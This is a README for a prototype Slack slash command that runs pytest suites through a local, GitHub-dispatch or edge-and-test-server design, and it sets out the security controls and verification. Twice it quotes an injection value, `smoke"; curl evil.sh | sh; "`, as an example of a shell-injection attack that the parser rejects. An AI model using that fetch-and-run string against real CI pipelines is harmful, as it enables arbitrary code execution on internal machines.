# slack-runtests

A working prototype of the **"Testing via Slack"** design from
[nehsa.net](https://nehsa.net) → Testing: a slash command that lets anyone on
the team run a pytest suite and read the outcome, without a GitHub account, a
VPN, or any knowledge of pytest's command line.

It ships in three versions, and the differences between them are the whole point.

| | What the public process does | Where tests run | Who queues | Who posts to Slack |
|---|---|---|---|---|
| **V1** `RUNTESTS_MODE=local` | validates, then runs pytest itself | **the API host** | nobody | the API |
| **V2** `RUNTESTS_MODE=github` | validates, then dispatches a workflow | a self-hosted runner polling **GitHub** | GitHub | the runner |
| **V3** edge + test servers | validates and queues; runs nothing | **your own test servers**, polling the edge | the edge (SQLite) | the test servers |

**V3 is the one to deploy, and it lives in [`edge/`](edge/) and
[`test-server/`](test-server/), each with its own README.**

The through-line across all three is one rule: *the process answering the
internet must not be the process running the tests.* V1 breaks it and is useful
anyway for one host. V2 fixes it by renting GitHub's queue and runners. V3 fixes
it while owning both — which costs a queue you have to write, and buys three
things renting could not:

- **No Slack token on any public host.** The edge answers Slack's HTTP request
  and never calls the Slack API. Every message in the channel is posted by the
  test server that ran the code, so it cannot claim something that did not
  happen.
- **No GitHub in the trust path**, and no `SLACK_BOT_TOKEN` distributed to every
  runner the way `runtests.yml` has to.
- **Mutual authentication.** Each test server holds an Ed25519 private key; the
  edge holds only public keys and signs its replies in return. Revoking a
  machine is deleting one file.

In every version the machines inside your network only ever call *out*, so they
need no inbound connectivity and no open port.

## Try it

```bash
bash run.sh                    # terminal 1 — V1/V2 API on :8500
bash test.sh                   # terminal 2 — POSTs a signed slash command
```

Or the deployable arrangement — an edge and three test servers, in containers:

```bash
docker compose -f docker/compose.yml up --build     # or: bash run.sh docker
bash test.sh                                        # in another terminal
docker compose -f docker/compose.yml logs -f runner-1
```

Only the edge publishes a port. The three test servers publish nothing, which
is the security property expressed as configuration.

**Use `run.sh` rather than a bare `uv run` on the Mac.** This workspace is a
Samba share, so both machines see the same `.venv` — and it is a Linux one. A
Mac that uses it fails with `error: Failed to spawn: ... No such file or
directory (os error 2)`, which names the console script even though the missing
file is the interpreter its shebang points at. `run.sh` sources
`../scripts/uv-env.sh`, which sends macOS to `.venv-macos` and leaves the Linux
`.venv` alone; it also syncs from `uv.lock` first, so a fresh checkout needs
nothing else. Invoke it as `bash run.sh` — the executable bit may not survive
to the Mac over SMB, and `bash run.sh` works either way.


`test.sh` sends a real, correctly-signed Slack payload. Watch **terminal 1** for
the run and its Slack output:

```
[slack:dry-run] post -> #testing
  Starting `webapp` on `staging`
[slack:dry-run] update -> #testing
  ✅ 3 passed  ·  0 failed  ·  1 skipped  ·  in 0.4s
```

More:

```bash
bash test.sh -- -p webapp -k smoke   # your own flags
bash test.sh --results               # read the last run instead of starting one
bash test.sh --bad                   # a rejected command, to see the error
bash test.sh --unsigned              # omit the signature (401 when configured)
RUNTESTS_MODE=github bash run.sh     # V2; dry-runs without a GH token
```

## `slack.py` — the library tests import

```python
from slack_runtests.slack import notify, SlackNotifier

notify("Smoke suite starting")                  # -> #testing
notify("Deploy verified", channel="releases")   # '#' optional

slack = SlackNotifier()
slack.start("Starting webapp @ staging")
slack.progress(passed=12, failed=0, total=50)
slack.finish(passed=48, failed=2, duration=91.4, run_url=...)
```

**With no `SLACK_BOT_TOKEN` it sends nothing and prints what it would have sent,
and to which channel.** The default channel is `#testing`.

**The servers say so at startup too**, before any message exists:

```
WARNING  slack-runtests: SLACK_BOT_TOKEN unset — Slack is NOT configured.
         Nothing will be sent to #testing; every message is printed to this
         console instead, as '[slack:dry-run] <verb> -> <channel>'.
```

Per-message printing alone is not enough: that first line arrives whenever the
first run happens, which may be hours after the process started and is exactly
when nobody is watching. An operator needs to know the service is inert when
they start it, not when it silently fails to report. A configured server says
the opposite at `INFO`, so the line is informative in both directions rather
than being a warning that is always present.

The test server names no channel in that line — it is told its channel by each
job, so it genuinely has none at startup, and printing the `#testing` default
there would be a confident falsehood.

That fallback is the design, not a debugging convenience — it is what makes the
library safe to import unconditionally from a test suite. The alternatives are
both worse: raising means every reporting test fails on a laptop, so people stop
calling it; silently doing nothing means you cannot tell "correctly inert" from
"misconfigured in CI and posting nowhere", and you find out weeks later when
someone asks why the channel went quiet.

Other decisions worth knowing:

- **A reporting failure never fails the run.** A Slack outage must not turn a
  green suite red, so network errors are logged and swallowed.
- **Edits are throttled** to one per 5s. `chat.update` is rate limited *per
  method per app*, so an unthrottled 500-test suite breaks every other thing the
  bot posts, not just its own run.
- **Output goes to stderr**, so it cannot corrupt a `--junit-xml` stream or a
  JSON report being piped somewhere.
- **`finish()` posts a summary, never the suite's stdout.** A run's output in a
  channel is how a channel gets muted, and how hostnames and stack traces reach
  a searchable, wide audience.

## Layout

```
slack-runtests/
├── test.sh                          # POST a signed slash command at the local server
├── src/slack_runtests/
│   ├── slack.py                     # the library tests import  ← console fallback
│   ├── parsing.py                   # flags + allowlists (a security boundary)
│   ├── signature.py                 # Slack HMAC verify, and the signer test.sh uses
│   ├── config.py                    # every environment read, in one place
│   ├── api.py                       # the endpoint; V1/V2 switch
│   └── runners/
│       ├── local.py                 # V1 — subprocess pytest here
│       └── github.py                # V2 — workflow_dispatch
├── edge/                            # V3 — the public deployable  (README inside)
│   └── edge_server/
│       ├── app.py                   # both doors: /slack/commands and /runner/*
│       ├── store.py                 # the queue: SQLite, atomic claim, leases
│       ├── auth.py                  # who may enrol, and how
│       └── config.py
├── test-server/                     # V3 — the internal deployable (README inside)
│   └── test_server/
│       ├── agent.py                 # enrol → heartbeat → claim → run → report
│       ├── client.py                # the only place a connection is opened
│       ├── reporter.py              # the four Slack milestones
│       └── config.py
├── docker/                          # 1 edge + 3 identical test servers
├── .github/workflows/runtests.yml   # the action V2 dispatches
└── tests/
    ├── unit/                        # this project's gate (136 tests)
    ├── integration/                 # 12 tests against REAL processes
    │   └── fixture_suite/webapp/    #   a suite with a KNOWN outcome, run for real
    └── sample/webapp/               # the demo suite the Slack command runs
```

`tests/sample` is excluded from `testpaths` on purpose: it is the suite the
server executes on demand, not part of this project's gate. Running it here
would conflate "the prototype works" with "the demo suite passes".

`tests/integration/fixture_suite` is excluded for a sharper reason: **one of its
tests fails on purpose.** It exists so the V1 runner can be pointed at a suite
whose outcome — 3 passed, 1 failed, 1 skipped — was decided in advance, which is
the only way to check that the counts scraped out of pytest's stdout are the
counts pytest actually produced. `norecursedirs` keeps this project's own gate
out of it; the runner still reaches it by naming the product directory inside,
so collection starts below the excluded name. Verified in both directions:
removing the entry makes `pytest tests/integration` collect 8 tests rather than
the tier's own.

## Security — the half that is most of it

The threat model is **not** "a stranger finds the URL"; the signature check
handles that in three lines. It is **everyone already in your Slack workspace**,
which on any real team includes guests, contractors, Slack Connect users from a
customer, and whoever inherits an ex-colleague's laptop. Authentication is easy
here; **authorisation is the work.**

| Control | Where |
|---|---|
| HMAC-SHA256 over the **raw body**, `compare_digest` | `signature.py` |
| Reject timestamps older than 5 minutes — an HMAC does not expire | `signature.py` |
| Pin `team_id` — proves it came from *your* Slack, not just from Slack | `api.py` |
| Allowlist channel **and** user — membership is not entitlement | `api.py` |
| Allowlist every value reaching a path or flag; strict regex on `-k`/`-m` | `parsing.py` |
| Build argv as a **list**, never `shell=True` | `runners/local.py` |
| Map every workflow input through `env:` | `runtests.yml` |
| Idempotent dispatch keyed on `trigger_id` | `api.py` |
| `concurrency:` cap — a slash command is a free trigger for an expensive job | `runtests.yml` |
| Summaries only; detail to the artifact | `slack.py` |

**`prod` is deliberately not a valid server.** If a production run must exist,
put it behind a GitHub Actions environment with required reviewers, so the
approval happens somewhere other than a chat box.

**The `env:` block in the workflow is a security control, not tidiness.** GitHub
substitutes `${{ ... }}` into the script *textually, before any shell sees it*,
so `run: pytest -k ${{ inputs.select }}` with a value of
`smoke"; curl evil.sh | sh; "` is arbitrary code execution on a machine inside
your network. Routing through `env:` makes the value data the shell already
holds. The regex in `parsing.py` is the second lock on the same door; keep both.

### Where this prototype knowingly differs from a real deployment

Stated plainly rather than left to be discovered:

- **With no `SLACK_SIGNING_SECRET` the server accepts unverified requests**, and
  logs a warning on every one. That is how `test.sh` works out of the box. It is
  refused as soon as a secret *is* set, so the insecure path cannot survive into
  a configured deployment — but a real service should not have it at all.
- **`_RUNS` is an in-process dict.** Two uvicorn workers would each get their
  own, and the idempotency guarantee silently disappears. Real deployments need
  Redis or Postgres.
- **V1 parses counts out of pytest's stdout.** The real implementation is the
  reporter plugin on the nehsa.net page, which hooks pytest and gets exact
  numbers. Unparseable output yields zeros rather than a wrong number, and the
  exit code is what decides pass/fail.
- **No GitHub App token minting.** `GITHUB_TOKEN` is read from the environment;
  production wants a ~1h installation token scoped to one repo.
- **`views.open` modals, `--junit-xml` artifact links, and per-user rate limits**
  are all described on the page and not built here.

## Verified

```bash
bash run.sh test -q                # 136 passed  (unit)
bash run.sh test:integration -q    #  12 passed  (integration, real processes)
```

Checked, not assumed:

- Full V1 round trip: `test.sh` → 200 ephemeral → background pytest → Slack
  dry-run output with real counts (3 passed, 1 skipped).
- Signed request accepted; **unsigned rejected 401** once a secret is configured.
- `-p ../../etc`, `-s prod`, and `-k 'smoke"; curl evil.sh | sh; "'` all refused.
- A retried `trigger_id` returns "already queued" and starts no second run.
- V2 with no credentials logs the dispatch it *would* have made.
- **Non-vacuity, V1/V2:** three vulnerabilities were planted — always-true
  signature, removed replay window, unrestricted product — and each was caught
  by the suite; green again after restore.
- **Non-vacuity, integration tier:** three more were planted, one per test —
  always-true signature (caught by the invalid-origin test), `../../etc` and
  `prod` added to the allowlists (caught by the invalid-structure test), and a
  gate that never accepts (caught by the accepted test). Each failed exactly
  the intended test and nothing else; all three green again after restore.
- **V1 count scraping, against a real pytest:** the runner is pointed at a
  fixture suite of 3 passed / 1 failed / 1 skipped and the reported numbers are
  compared to those. Non-vacuity, five plants, each restored: a typo in the
  summary regex (reported `(3, 1, 0)` — **wrong, not absent**, which is the
  whole risk); reading only the first line of pytest's output (reported zeros,
  and **the unit tier stayed green at 136 passed** — the case no unit test can
  see); returning 0 instead of pytest's exit code; a workspace id added to the
  dispatch payload; and the runner door's Ed25519 check disabled.
- **The dispatch payload, over real sockets:** a test server enrols through the
  pre-authorised-key path, claims a job, and the payload is compared field by
  field against the slash command that produced it — matched by the job id the
  edge named in its reply, so it cannot pass against somebody else's job. It is
  also checked for what it must *not* carry, and the edge's replies are verified
  against the public key it publishes.
- **The V3 harness, end to end:** `docker compose up`, three test servers
  enrolled with distinct Ed25519 keys and went online; five slash commands were
  distributed across all three with no job run twice; all five reported
  `done` with `3 passed · 0 failed · 1 skipped`; all four Slack milestones
  appeared on each runner's console with the runner named.
- **Offline detection:** with all three stopped, the fleet view showed
  `offline` after 30s and a new command answered *"queued, but no test server is
  online"*. Restarting them ran that queued job — so the message is true, not
  just reassuring.

### Testing gap

**Unit and integration tiers exist; the E2E tier is partial and must be
described as such.** The docker harness drives a real slash command through a
real edge to three real test servers that really run pytest — but with no Slack
workspace, so the last hop is a console print rather than a message in a
channel. That is *E2E minus Slack*, and calling it end-to-end without the
qualifier would be claiming a tier that does not exist. TLS and the public
internet are likewise not covered.

**The outbound Slack request IS covered, against a real local server** —
`tests/integration/test_outbound_to_slack.py` points `SLACK_API_BASE` at an
ephemeral `127.0.0.1` port and lets `SlackNotifier` make a genuine HTTP request,
so the JSON body, the bearer header, the charset and the method are asserted on
the wire. No secret, no workspace, no network.

That tier exists because the unit tests stub `fetch` and assert on what was
handed to the stub: they prove the *call site* and nothing about the request.
Measured — **delete the `Authorization` header entirely and the unit tier still
reports 141 passed**, while every real request would fail `invalid_auth`.

A staging Slack workspace was considered for the last hop and rejected
(NEH-1088). A Slack app, a bot token, a signing secret and a runner holding a
private key is a permanent operational burden for a prototype, and what it
would prove — that Slack's API works — is not where the defects are. Recorded
inbound fixtures were the other candidate and are strictly weaker: they describe
what Slack sends us, never what we send Slack, and a fixture cannot be wrong
about a header nobody wrote down.

Also still missing: the lease-expiry recovery path is proven by unit tests with
a controlled clock rather than by killing a container mid-run.

**`runners/local.py` is no longer argv-only** — `tests/integration/
test_local_runner.py` spawns a real pytest through it and checks the scraped
counts against a fixture suite with a known outcome. What that does *not* cover
is a pytest version whose summary format differs from the one installed here:
the check is only as current as the lockfile.

## License

Apache License 2.0 — see [LICENSE](LICENSE) and [NOTICE](NOTICE).
Copyright 2026 nehsa.net.
